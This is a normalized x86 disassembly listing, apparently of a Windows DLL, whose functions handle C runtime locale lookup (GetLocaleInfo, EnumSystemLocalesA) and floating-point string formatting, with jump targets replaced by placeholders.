or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_1002f2f7
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1002f2f7
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1002f2f7
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_1007bcc3
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_10078ac0
inc eax
push eax
push esi
add esi edi
push esi
call sub_10077d10
add esp 0x10
sub_1007bce2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_10054678
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_10012991
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_10012991
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_1007bcc3
pop esi
mov [ eax ] esi
call sub_1002788e
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_10077d10
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_1007be43
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_10054678
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
call sub_1002788e
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_10078ac0
inc eax
push eax
push esi
push ebx
call sub_10077d10
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_10078ac0
inc eax
push eax
push esi
push ebx
call sub_10077d10
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_1007bcc3
push edi
push 0x30
push ebx
call sub_10078970
add esp 0xc
sub_1007bf47
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10036463
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_10056814
pop ecx
cmp eax esi
je r-xdata
call sub_1007c030
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_1007c060
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_1007c0a6
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_10028b2b
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_1007c108
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_10078c40
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_10078c40
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_100617ac
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_1007c18c
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1007c1b1
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_1007c1e2
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_1007c1fd
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10044fed
mov edx edi
mov esi eax
call sub_1007c1b1
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_10028b2b
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_1007c18c
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_1007c2a4
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_1007c1e2
push esi
mov edi eax
call sub_10078ac0
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_1007c2ff
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10044fed
mov edx edi
lea esi [ eax + 0x9c ]
call sub_1007c1b1
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_10028b2b
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028b2b
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028b2b
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1001e162
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028b2b
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_10078ac0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_1007c18c
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_10078ac0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_1007c2a4
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1007c4d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10044fed
mov edx edi
lea esi [ eax + 0x9c ]
call sub_1007c1b1
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028b2b
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10028b2b
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_1007c2a4
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_1007c590
push [ esi ]
call sub_10078ac0
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_10078ac0
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_1007c1e2
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_1007c2ff
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_1007c5f7
push [ esi ]
call sub_10078ac0
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_1007c1e2
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_1007c4d0
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_1007c640
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_1007c680
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
